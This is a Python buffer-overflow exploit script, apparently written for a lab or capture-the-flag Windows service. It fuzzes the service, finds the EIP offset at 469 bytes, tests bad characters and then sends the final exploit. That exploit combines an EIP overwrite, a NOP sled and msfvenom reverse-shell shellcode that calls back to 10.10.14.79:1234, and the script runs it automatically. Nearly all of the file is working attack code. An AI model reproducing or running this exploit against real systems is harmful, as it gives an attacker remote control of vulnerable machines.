#!/usr/bin/python3
# Program to fuzz, find badchars, and exploit buffer overflow on windows
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449


def fuzz():
    try:
        for i in range(0, 10000, 500):
            buffer = b"A" * i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            breakpoint()
            s.send(buffer)
            s.close()
    except:
        print("Could not establish a connection")


def eip_offset():
    pattern = b"""\x41\x61\x30\x41\x61\x31\x41\x61\x32\x41\x61\x33\x41\x61\x34\x41\x61\x35\x41\x61\x36\x41\x61\x37\x41\x61\x38\x41\x61\x39\x41\x62\x30\x41\x62\x31\x41\x62\x32\x41\x62\x33\x41\x62\x34\x41\x62\x35\x41\x62\x36\x41\x62\x37\x41\x62\x38\x41\x62\x39\x41\x63\x30\x41\x63\x31\x41\x63\x32\x41\x63\x33\x41\x63\x34\x41\x63\x35\x41\x63\x36\x41\x63\x37\x41\x63\x38\x41\x63\x39\x41\x64\x30\x41\x64\x31\x41\x64\x32\x41\x64\x33\x41\x64\x34\x41\x64\x35\x41\x64\x36\x41\x64\x37\x41\x64\x38\x41\x64\x39\x41\x65\x30\x41\x65\x31\x41\x65\x32\x41\x65\x33\x41\x65\x34\x41\x65\x35\x41\x65\x36\x41\x65\x37\x41\x65\x38\x41\x65\x39\x41\x66\x30\x41\x66\x31\x41\x66\x32\x41\x66\x33\x41\x66\x34\x41\x66\x35\x41\x66\x36\x41\x66\x37\x41\x66\x38\x41\x66\x39\x41\x67\x30\x41\x67\x31\x41\x67\x32\x41\x67\x33\x41\x67\x34\x41\x67\x35\x41\x67\x36\x41\x67\x37\x41\x67\x38\x41\x67\x39\x41\x68\x30\x41\x68\x31\x41\x68\x32\x41\x68\x33\x41\x68\x34\x41\x68\x35\x41\x68\x36\x41\x68\x37\x41\x68\x38\x41\x68\x39\x41\x69\x30\x41\x69\x31\x41\x69\x32\x41\x69\x33\x41\x69\x34\x41\x69\x35\x41\x69\x36\x41\x69\x37\x41\x69\x38\x41\x69\x39\x41\x6a\x30\x41\x6a\x31\x41\x6a\x32\x41\x6a\x33\x41\x6a\x34\x41\x6a\x35\x41\x6a\x36\x41\x6a\x37\x41\x6a\x38\x41\x6a\x39\x41\x6b\x30\x41\x6b\x31\x41\x6b\x32\x41\x6b\x33\x41\x6b\x34\x41\x6b\x35\x41\x6b\x36\x41\x6b\x37\x41\x6b\x38\x41\x6b\x39\x41\x6c\x30\x41\x6c\x31\x41\x6c\x32\x41\x6c\x33\x41\x6c\x34\x41\x6c\x35\x41\x6c\x36\x41\x6c\x37\x41\x6c\x38\x41\x6c\x39\x41\x6d\x30\x41\x6d\x31\x41\x6d\x32\x41\x6d\x33\x41\x6d\x34\x41\x6d\x35\x41\x6d\x36\x41\x6d\x37\x41\x6d\x38\x41\x6d\x39\x41\x6e\x30\x41\x6e\x31\x41\x6e\x32\x41\x6e\x33\x41\x6e\x34\x41\x6e\x35\x41\x6e\x36\x41\x6e\x37\x41\x6e\x38\x41\x6e\x39\x41\x6f\x30\x41\x6f\x31\x41\x6f\x32\x41\x6f\x33\x41\x6f\x34\x41\x6f\x35\x41\x6f\x36\x41\x6f\x37\x41\x6f\x38\x41\x6f\x39\x41\x70\x30\x41\x70\x31\x41\x70\x32\x41\x70\x33\x41\x70\x34\x41\x70\x35\x41\x70\x36\x41\x70\x37\x41\x70\x38\x41\x70\x39\x41\x71\x30\x41\x71\x31\x41\x71\x32\x41\x71\x33\x41\x71\x34\x41\x71\x35\x41\x71"""

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()


def eip_control():
    offset = 469
    buffer = b"A" * offset
    eip = b"B" * 4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()


# badhcars = \x00\x0a\x0d
def bad_chars():
    all_chars = bytes(
        [
            0x00,
            0x01,
            0x02,
            0x03,
            0x04,
            0x05,
            0x06,
            0x07,
            0x08,
            0x09,
            0x0A,
            0x0B,
            0x0C,
            0x0D,
            0x0E,
            0x0F,
            0x10,
            0x11,
            0x12,
            0x13,
            0x14,
            0x15,
            0x16,
            0x17,
            0x18,
            0x19,
            0x1A,
            0x1B,
            0x1C,
            0x1D,
            0x1E,
            0x1F,
            0x20,
            0x21,
            0x22,
            0x23,
            0x24,
            0x25,
            0x26,
            0x27,
            0x28,
            0x29,
            0x2A,
            0x2B,
            0x2C,
            0x2D,
            0x2E,
            0x2F,
            0x30,
            0x31,
            0x32,
            0x33,
            0x34,
            0x35,
            0x36,
            0x37,
            0x38,
            0x39,
            0x3A,
            0x3B,
            0x3C,
            0x3D,
            0x3E,
            0x3F,
            0x40,
            0x41,
            0x42,
            0x43,
            0x44,
            0x45,
            0x46,
            0x47,
            0x48,
            0x49,
            0x4A,
            0x4B,
            0x4C,
            0x4D,
            0x4E,
            0x4F,
            0x50,
            0x51,
            0x52,
            0x53,
            0x54,
            0x55,
            0x56,
            0x57,
            0x58,
            0x59,
            0x5A,
            0x5B,
            0x5C,
            0x5D,
            0x5E,
            0x5F,
            0x60,
            0x61,
            0x62,
            0x63,
            0x64,
            0x65,
            0x66,
            0x67,
            0x68,
            0x69,
            0x6A,
            0x6B,
            0x6C,
            0x6D,
            0x6E,
            0x6F,
            0x70,
            0x71,
            0x72,
            0x73,
            0x74,
            0x75,
            0x76,
            0x77,
            0x78,
            0x79,
            0x7A,
            0x7B,
            0x7C,
            0x7D,
            0x7E,
            0x7F,
            0x80,
            0x81,
            0x82,
            0x83,
            0x84,
            0x85,
            0x86,
            0x87,
            0x88,
            0x89,
            0x8A,
            0x8B,
            0x8C,
            0x8D,
            0x8E,
            0x8F,
            0x90,
            0x91,
            0x92,
            0x93,
            0x94,
            0x95,
            0x96,
            0x97,
            0x98,
            0x99,
            0x9A,
            0x9B,
            0x9C,
            0x9D,
            0x9E,
            0x9F,
            0xA0,
            0xA1,
            0xA2,
            0xA3,
            0xA4,
            0xA5,
            0xA6,
            0xA7,
            0xA8,
            0xA9,
            0xAA,
            0xAB,
            0xAC,
            0xAD,
            0xAE,
            0xAF,
            0xB0,
            0xB1,
            0xB2,
            0xB3,
            0xB4,
            0xB5,
            0xB6,
            0xB7,
            0xB8,
            0xB9,
            0xBA,
            0xBB,
            0xBC,
            0xBD,
            0xBE,
            0xBF,
            0xC0,
            0xC1,
            0xC2,
            0xC3,
            0xC4,
            0xC5,
            0xC6,
            0xC7,
            0xC8,
            0xC9,
            0xCA,
            0xCB,
            0xCC,
            0xCD,
            0xCE,
            0xCF,
            0xD0,
            0xD1,
            0xD2,
            0xD3,
            0xD4,
            0xD5,
            0xD6,
            0xD7,
            0xD8,
            0xD9,
            0xDA,
            0xDB,
            0xDC,
            0xDD,
            0xDE,
            0xDF,
            0xE0,
            0xE1,
            0xE2,
            0xE3,
            0xE4,
            0xE5,
            0xE6,
            0xE7,
            0xE8,
            0xE9,
            0xEA,
            0xEB,
            0xEC,
            0xED,
            0xEE,
            0xEF,
            0xF0,
            0xF1,
            0xF2,
            0xF3,
            0xF4,
            0xF5,
            0xF6,
            0xF7,
            0xF8,
            0xF9,
            0xFA,
            0xFB,
            0xFC,
            0xFD,
            0xFE,
            0xFF,
        ]
    )

    offset = 469
    buffer = b"A" * offset
    eip = b"B" * 4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()


def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.79 LPORT=1234 -f 'python' -b '\x00\x0A\x0D'
    buf = b""
    buf += b"\xbd\x39\xd8\x43\x3f\xd9\xea\xd9\x74\x24\xf4\x5f"
    buf += b"\x29\xc9\xb1\x52\x31\x6f\x12\x03\x6f\x12\x83\xd6"
    buf += b"\x24\xa1\xca\xd4\x3d\xa4\x35\x24\xbe\xc9\xbc\xc1"
    buf += b"\x8f\xc9\xdb\x82\xa0\xf9\xa8\xc6\x4c\x71\xfc\xf2"
    buf += b"\xc7\xf7\x29\xf5\x60\xbd\x0f\x38\x70\xee\x6c\x5b"
    buf += b"\xf2\xed\xa0\xbb\xcb\x3d\xb5\xba\x0c\x23\x34\xee"
    buf += b"\xc5\x2f\xeb\x1e\x61\x65\x30\x95\x39\x6b\x30\x4a"
    buf += b"\x89\x8a\x11\xdd\x81\xd4\xb1\xdc\x46\x6d\xf8\xc6"
    buf += b"\x8b\x48\xb2\x7d\x7f\x26\x45\x57\xb1\xc7\xea\x96"
    buf += b"\x7d\x3a\xf2\xdf\xba\xa5\x81\x29\xb9\x58\x92\xee"
    buf += b"\xc3\x86\x17\xf4\x64\x4c\x8f\xd0\x95\x81\x56\x93"
    buf += b"\x9a\x6e\x1c\xfb\xbe\x71\xf1\x70\xba\xfa\xf4\x56"
    buf += b"\x4a\xb8\xd2\x72\x16\x1a\x7a\x23\xf2\xcd\x83\x33"
    buf += b"\x5d\xb1\x21\x38\x70\xa6\x5b\x63\x1d\x0b\x56\x9b"
    buf += b"\xdd\x03\xe1\xe8\xef\x8c\x59\x66\x5c\x44\x44\x71"
    buf += b"\xa3\x7f\x30\xed\x5a\x80\x41\x24\x99\xd4\x11\x5e"
    buf += b"\x08\x55\xfa\x9e\xb5\x80\xad\xce\x19\x7b\x0e\xbe"
    buf += b"\xd9\x2b\xe6\xd4\xd5\x14\x16\xd7\x3f\x3d\xbd\x22"
    buf += b"\xa8\x48\x48\x22\x67\x25\x4e\x3a\x73\x67\xc7\xdc"
    buf += b"\x11\x97\x8e\x77\x8e\x0e\x8b\x03\x2f\xce\x01\x6e"
    buf += b"\x6f\x44\xa6\x8f\x3e\xad\xc3\x83\xd7\x5d\x9e\xf9"
    buf += b"\x7e\x61\x34\x95\x1d\xf0\xd3\x65\x6b\xe9\x4b\x32"
    buf += b"\x3c\xdf\x85\xd6\xd0\x46\x3c\xc4\x28\x1e\x07\x4c"
    buf += b"\xf7\xe3\x86\x4d\x7a\x5f\xad\x5d\x42\x60\xe9\x09"
    buf += b"\x1a\x37\xa7\xe7\xdc\xe1\x09\x51\xb7\x5e\xc0\x35"
    buf += b"\x4e\xad\xd3\x43\x4f\xf8\xa5\xab\xfe\x55\xf0\xd4"
    buf += b"\xcf\x31\xf4\xad\x2d\xa2\xfb\x64\xf6\xd2\xb1\x24"
    buf += b"\x5f\x7b\x1c\xbd\xdd\xe6\x9f\x68\x21\x1f\x1c\x98"
    buf += b"\xda\xe4\x3c\xe9\xdf\xa1\xfa\x02\x92\xba\x6e\x24"
    buf += b"\x01\xba\xba"

    offset = 469
    buffer = b"A" * offset
    eip = pack("<L", 0x621014E3)
    nop = b"\x90" * 32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Sending payload")
    s.connect((IP, port))
    s.send(payload)
    s.close()


exploit()
